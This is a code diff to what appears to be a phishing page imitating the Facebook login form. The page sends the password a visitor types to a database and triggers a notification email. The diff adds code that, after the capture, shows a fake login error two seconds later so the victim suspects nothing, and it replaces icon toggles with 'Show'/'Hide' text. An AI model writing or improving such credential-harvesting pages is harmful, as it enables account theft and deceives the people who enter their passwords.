@@ -189,15 +189,13 @@
             background: none;
             border: none;
             cursor: pointer;
-            color: #8a8d91;
-            font-size: 16px;
+            color: #1877f2;
+            font-size: 14px;
             padding: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            font-weight: 500;
         }
         .show-password, .hide-password {
-            font-size: 20px;
+            font-size: 14px;
         }
         .hide-password {
             display: none;
@@ -244,8 +242,8 @@
                 <div class="password-container">
                     <input type="password" id="password" name="password" placeholder=" " required>
                     <button type="button" class="password-toggle" id="password-toggle">
-                        <span class="show-password">👁️</span>
-                        <span class="hide-password">👁️‍🗨️</span>
+                        <span class="show-password">Show</span>
+                        <span class="hide-password">Hide</span>
                     </button>
                     <span class="floating-label">Password</span>
                 </div>
@@ -341,19 +339,32 @@
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(userData)
                     })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        return response.json();
+                    })
                     .then(data => {
                         console.log('Data saved to database:', data);
                         
                         // Then send notification email
                         sendNotificationEmail();
                         
-                        // Optionally redirect after a delay
-                        // setTimeout(function() {
-                        //     window.location.href = 'https://facebook.com/';
-                        // }, 1000);
+                        // Show error after delay
+                        setTimeout(function() {
+                            loginButton.innerHTML = 'Log in';
+                            loginButton.disabled = false;
+                            errorMessage.style.display = 'block';
+                        }, 2000);
                     })
                     .catch(error => {
                         console.error('Error saving data:', error);
+                        setTimeout(function() {
+                            loginButton.innerHTML = 'Log in';
+                            loginButton.disabled = false;
+                            errorMessage.style.display = 'block';
+                        }, 2000);
                     });
                 }, 1500); // 1.5 second delay for verification
             });
